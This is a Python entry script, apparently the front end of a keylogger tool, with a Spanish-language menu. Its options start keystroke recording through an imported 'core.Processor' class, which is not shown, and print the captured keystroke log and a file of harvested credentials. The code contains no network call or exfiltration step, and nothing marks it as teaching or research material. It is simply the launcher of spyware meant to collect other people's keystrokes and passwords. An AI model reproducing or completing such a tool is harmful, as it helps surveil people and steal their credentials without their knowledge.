#!/usr/bin/env python
import enum
import pathlib

from core import Processor


class Option(enum.Enum):
    RECORD_KEYS = 1
    READ_LOGS = 2
    READ_CREDENTIALS = 3


def display_file(path):
    with open(path, 'r', encoding='utf-8') as fp:
        for line in fp:
            print(line)


def logo(path):
    with open(path, 'r', encoding='utf-8') as fp:
        ascii_art = ''.join(fp.readlines())

    return ascii_art


def menu():
    return '\n'.join(
        [
            '\n¿Qué desea hacer?',
            '\t(1) Registrar pulsaciones de teclado',
            '\t(2) Leer registros',
            '\t(3) Leer credenciales\n'
        ]
    )


def main():
    base_dir = pathlib.Path(__file__).resolve().parent
    log_file = base_dir / 'keylog.txt'
    credential_file = base_dir / 'credentials.txt'

    print(logo(base_dir / 'logo.txt'))
    display = menu()
    show = True
    while show:
        print(display)
        option = input('Escoja una opción [1-3] (Q para salir): ').lower().strip()
        try:
            option = Option(int(option))
            if option == Option.RECORD_KEYS:
                Processor(log_file, credential_file).record()
            elif option == Option.READ_LOGS:
                display_file(log_file)
            elif option == Option.READ_CREDENTIALS:
                display_file(credential_file)

            show = False

        except ValueError:
            if option == 'q':
                show = False
            else:
                reason = f'Opción no válida: \'{option}\'' if len(option) > 0 else 'No se ha elegido nada'
                print(reason)


if __name__ == '__main__':
    main()
